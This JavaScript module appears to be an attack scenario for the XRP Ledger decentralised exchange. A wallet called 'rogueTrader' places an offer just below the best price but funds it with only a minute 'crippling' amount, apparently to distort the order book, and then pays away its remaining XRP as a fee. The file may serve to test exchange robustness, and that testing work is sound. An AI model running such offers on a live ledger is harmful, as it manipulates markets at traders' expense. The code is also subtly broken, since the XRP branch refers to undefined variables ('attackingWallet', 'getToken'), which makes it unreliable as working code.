import { mul, div, sub, floor } from '@xrplkit/xfl/string'
import { toRippled } from '@xrplkit/amount'
import { submitAndWait } from '../lib/tx.js'
import { fundTrader } from '../lib/iou.js'


const initialValue = '1'
const nudgeFactor = '1.17'


export default async function(ctx){
	let { socket, wallets, book, base, quote } = ctx

	let smallestUnit = quote.currency === 'XRP' || base.currency === 'XRP'
		? '0.000001'
		: '0.000000000000000000000000000000000000000000000000000000000000000000000000000000001'
	

	let targetPrice = mul(book.bestPrice, '0.99')
	let offerPay = initialValue
	let offerGet = mul(offerPay, targetPrice)
	let cripplingGet = mul(smallestUnit, nudgeFactor)
	let cripplingPay = mul(div(cripplingGet, offerGet), offerPay)
	let burnValue = sub(offerPay, cripplingPay)

	console.log(`offer target price: ${targetPrice} ${quote.currency}/${base.currency}`)
	console.log(`offer initial takerPays: ${offerGet} ${quote.currency}`)
	console.log(`offer initial takerGets: ${offerPay} ${base.currency}`)
	console.log(`offer crippled takerPays: ${cripplingGet} ${quote.currency}`)
	console.log(`offer crippled takerGets: ${cripplingPay} ${base.currency}`)
	console.log(`burn target: ${burnValue} ${quote.currency}`)


	if(base.currency !== 'XRP'){
		await fundTrader({ 
			socket,
			traderWallet: wallets.rogueTrader, 
			issuerWallet: wallets.baseIssuer,
			currency: base.currency,
			value: cripplingPay
		})
	}


	await submitAndWait({
		socket,
		tx: {
			TransactionType: 'OfferCreate',
			Account: wallets.rogueTrader.address,
			TakerPays: toRippled({
				...quote,
				value: offerGet
			}),
			TakerGets: toRippled({
				...base,
				value: offerPay
			}),
		},
		seed: wallets.rogueTrader.seed,
		autofill: true
	})

	if(base.currency === 'XRP'){
		console.log(`disposing of balance`)

		let { account_info } = await socket.request({
			command: 'account_info',
			account: attackingWallet.address
		})

		let fee = floor(sub(account_info.Balance, '1'))

		await submitAndWait({
			socket,
			tx: {
				TransactionType: 'Payment',
				Account: attackingWallet.address,
				Destination: getToken.issuer,
				Amount: '1',
				Fee: fee
			},
			seed: attackingWallet.seed,
			autofill: true
		})
	}

	return ctx
}